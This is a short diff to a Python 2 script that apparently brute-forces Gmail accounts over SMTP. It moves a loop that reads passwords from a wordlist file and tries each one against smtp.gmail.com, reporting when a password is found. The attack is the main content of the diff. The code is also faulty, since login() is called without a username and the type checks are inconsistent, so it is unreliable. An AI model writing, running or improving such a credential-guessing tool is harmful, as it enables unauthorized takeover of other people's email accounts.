@@ -10,14 +10,24 @@ smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
 smtpserver.ehlo()
 smtpserver.starttls()
 
+passwfile = raw_input("Enter the password file name: ")
+passwfile = open(passwfile, "r")
+
+for password in passwfile:
+  try:
+    smtpserver.login(password)
+  
+    print "[+] Password Found %s" % password
+    break;
+  except smtplib.SMTPAuthenticationError:
+    print "[!] Password Incorrect: %s" % password
+
+
 #options
 
 type_of_paswords = raw_input("number of bits in password? ie: 16,32,64...512")
 while type_of_paswords != "16" and type_of_paswords != "32" and type_of_paswords != "64" and type_of_paswords != 128 and type_of_paswords != "256" and type_of_paswords != "512":
   type_of_paswords = raw_input("no you did it wrong, put a base two number between 16 and 512")
-
-passwfile = raw_input("Enter the password file name: ")
-passwfile = open(passwfile, "r")
 
 
 password = "placce_holder"
@@ -48,11 +58,3 @@ else:
 
 
 
-for password in passwfile:
-  try:
-    smtpserver.login(password)
-  
-    print "[+] Password Found %s" % password
-    break;
-  except smtplib.SMTPAuthenticationError:
-    print "[!] Password Incorrect: %s" % password
